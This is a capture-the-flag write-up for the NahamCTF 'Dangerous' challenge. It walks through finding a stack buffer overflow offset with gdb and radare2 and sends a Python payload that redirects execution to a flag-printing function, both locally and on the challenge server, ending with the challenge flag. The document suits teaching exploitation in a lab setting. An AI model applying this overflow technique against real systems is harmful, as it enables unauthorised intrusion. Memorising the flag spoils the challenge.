---
title: "NahamCTF: Dangerous"
categories:
  - NahamCTF
tags:
  - NahamCTF
---

"Hey! Listen!

Connect here:
nc jh2i.com 50011"

For this challenge, we're given a binary called "dangerous". It appears to be stripped, as analyzing it with radare2 doesn't give us many functions to call. 

Running the binary prompts us for our name, then tells us to "Take this":

```
What's your name?
anti
It's dangerous to go alone! Take this, anti

         █   
        ███  
        ███  
        ███  
        ███  
        ███  
        ███  
        ███  
        ███  
        ███  
      ███████
      █ ███ █
        ███  
        ███  
        ███  

```

To see if this is vulnerable to a buffer overflow, we'll open it up in gdb, and see if we can get it to segfault:

```
gdb ./dangerous

gdb-peda$ pattern create 700

r <<< $(echo 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%B
A%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0A
sFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB
4ABJABfAB5ABKABgAB6')

...
RSP: 0x7fffffffe0d8 ("s6AsLAshAs7AsMA")
...
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x000000000040130d in ?? ()

```

The interesting part of this is the RSP register, as it has part of our pattern in it, so we can use gdb's pattern search feature to find it:

```
pattern search s6AsLAshAs7AsMA
...
RBP+0 found at offset: 489
Registers point to pattern buffer:
[RSP] --> offset 497 - size ~15
...
```

If we swap the pattern out for A's and B's with python, we can very that we have RIP control:

```
gdb-peda$ r <<< $(python -c 'print "A"*497 + "B"*4')
...
RIP: 0x7f0a42424242
...
```

We now know that we have a buffer overflow vulnerability, and that we have control of the execution flow of the program.

We'll start our process of exploitation with radare2:

```
r2 -d dangerous
aaa
afl
```

We can see that we don't have any functions that we can call, so we'll step through the binary and see what it's doing.

```
[0x7ffff7fd5090]> dc
What's your name?
```

Here, we want to CTRL+C so that we can step into the syscall, without it continuing execution after we enter our input:

```
*What's your name?*
[0x7ffff7ed85ce]> ds
anti
[0x7ffff7ed85ce]>
```

Now, we can enter visual mode and step through the binary by hitting s. After stepping three to four times, we can see an interesting portion of the assembly that appears to be opening flag.txt, reading it, and outputting it to the screen:

```
0x00401312      55             push rbp                                                                                                      
0x00401313      4889e5         mov rbp, rsp                                                                                                  
0x00401316      4881ec100200.  sub rsp, 0x210                                                                                                
0x0040131d      be00000000     mov esi, 0                                                                                                    
0x00401322      488d3d160f00.  lea rdi, qword str.._flag.txt    ; 0x40223f ; "./flag.txt"                                                    
0x00401329      b800000000     mov eax, 0                                                                                                    
0x0040132e      e8adfdffff     call sym.imp.open         ;[2]                                                                                
0x00401333      8945fc         mov dword [rbp - 4], eax                                                                                      
0x00401336      488d8df0fdff.  lea rcx, qword [rbp - 0x210]                                                                                  
0x0040133d      8b45fc         mov eax, dword [rbp - 4]                                                                                      
0x00401340      ba00020000     mov edx, 0x200            ; rdx                                                                               
0x00401345      4889ce         mov rsi, rcx                                                                                                  
0x00401348      89c7           mov edi, eax                                                                                                  
0x0040134a      e871fdffff     call sym.imp.read         ;[3]                                                                                
0x0040134f      8b45fc         mov eax, dword [rbp - 4]                                                                                      
0x00401352      89c7           mov edi, eax                                                                                                  
0x00401354      e857fdffff     call sym.imp.close        ;[4]                                                                                
0x00401359      488d85f0fdff.  lea rax, qword [rbp - 0x210]                                                                                  
0x00401360      4889c7         mov rdi, rax                                                                                                  
0x00401363      e828fdffff     call sym.imp.puts         ;[1]                                                                                
0x00401368      90             nop                                                                                                           
0x00401369      c9             leave                                                                                                         
0x0040136a      c3             ret
```

Since there isn't a function that directly calls this, we'll have to jump directly to this memory address. Before we continue, we'll want to create a fake flag in the same directory as the binary, named flag.txt. For this challenge, we'll put "flag{hellothere}" in the flag.txt file.

Now that we have an address to jump to, and we know where the buffer overflows, we can build our exploit:

```
python -c 'print "A"*497 + "\x12\x13\x40\x00\x00\x00\x00\x00"' | ./dangerous

What's your name?
It's dangerous to go alone! Take this, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
         █   
        ███  
        ███  
        ███  
        ███  
        ███  
        ███  
        ███  
        ███  
        ███  
      ███████
      █ ███ █
        ███  
        ███  
        ███  

flag{hellothere}
e! Take this, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
```

Nice, we know that it works now, so we'll aim it at the server, and fire it!

```
python -c 'print "A"*497 + "\x12\x13\x40\x00\x00\x00\x00\x00"' | nc jh2i.com 50011
What's your name?
It's dangerous to go alone! Take this, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
         █   
        ███  
        ███  
        ███  
        ███  
        ███  
        ███  
        ███  
        ███  
        ███  
      ███████
      █ ███ █
        ███  
        ███  
        ███  

flag{legend_of_zelda_overflow_of_time}
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

There's our flag!

**flag{legend_of_zelda_overflow_of_time}**

